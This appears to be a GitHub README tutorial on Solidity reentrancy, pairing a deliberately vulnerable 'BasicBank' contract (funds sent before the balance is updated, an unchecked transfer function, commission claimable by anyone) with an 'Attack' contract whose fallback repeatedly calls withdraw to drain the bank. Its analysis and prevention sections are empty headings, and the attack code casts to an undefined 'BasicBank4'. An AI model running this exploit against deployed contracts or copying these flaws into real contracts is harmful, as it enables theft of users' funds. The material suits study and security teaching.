# Reentracy Attack
## 🗺️ Overview 
The Reentrancy attack is one of the most destructive attacks in the Solidity smart contract. A reentrancy attack occurs when a function makes an external call to another untrusted contract. Then the untrusted contract makes a recursive call back to the original function in an attempt to drain funds.



When the contract fails to update its state before sending funds, the attacker can continuously call the withdraw function to drain the contract’s funds. A famous real-world Reentrancy attack is the DAO attack which caused a loss of 60 million US dollars.

## How Does Reentracy Attack Work?
<img src='https://github.com/wasny0ps/Reentracy/blob/main/img/reentracy.png'>

## 🎬 Reentrancy Attack Scenario
1> The vulnerable smart contract has 10 eth.

2> An attacker stores 1 eth using the deposit function.

3> An attacker calls the withdraw function and points to a malicious contract as a recipient.

4> Now withdraw function will verify if it can be executed:

Does the attacker have 1 eth on their balance? Yes – because of their deposit.

Transfer 1 eth to a malicious contract. (Note: attacker balance has NOT been updated yet)

Fallback function on received eth calls withdraw function again.

4>Now withdraw function will verify if it can be executed:

Does the attacker have 1 eth on their balance? Yes – because the balance has not been updated.

Transfer 1 eth to a malicious contract and again until the attacker will drain all the funds stored on the contract.
## 📄 Example Of Vulnereable Contract
This contract is designed to provide basic web3 banking services and includes vulnerabilities that are frequently encountered in other smart contracts.
```
//SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

contract BasicBank {

    mapping (address => uint) private userFunds;
    address private commissionCollector;
    uint private collectedComission = 0;

    constructor() {
        commissionCollector = msg.sender;
    }
    
    modifier onlyCommissionCollector {
        require(msg.sender == commissionCollector);
        _;
    }

    function deposit() public payable {
        require(msg.value >= 1 ether);
        userFunds[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) external payable {
        require(getBalance(msg.sender) >= _amount);
        msg.sender.call{value: _amount}("");
        userFunds[msg.sender] -= _amount;
        userFunds[commissionCollector] += _amount/100;
    }   

    function getBalance(address _user) public view returns(uint) {
        return userFunds[_user];
    }

    function getCommissionCollector() public view returns(address) {
        return commissionCollector;
    }

    function transfer(address _userToSend, uint _amount) external{
        userFunds[_userToSend] += _amount;
        userFunds[msg.sender] -= _amount;
    }

    function setCommissionCollector(address _newCommissionCollector) external onlyCommissionCollector{
        commissionCollector = _newCommissionCollector;
    }

    function collectCommission() external {
        userFunds[msg.sender] += collectedComission;
        collectedComission = 0;
    }
}
```
## 👨‍💻 Analyzing
## Attacking
```
//SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import './BasicBank.sol';

contract Attack{
    BasicBank public target;
    constructor(address payable _target){
        target = BasicBank4(_target);
    }
    function attack() external payable{
        require(msg.value >= 1e18, "At least 1 ether");
        target.deposit{value: 1e18}();
        target.withdraw(1e18);
    }
    fallback()external payable{
        if(address(target).balance >= 1e18){
            target.withdraw(1e18);
        }
    }
}
```
## How To Prevent Reentracy Attack?



**_wasny0ps_**
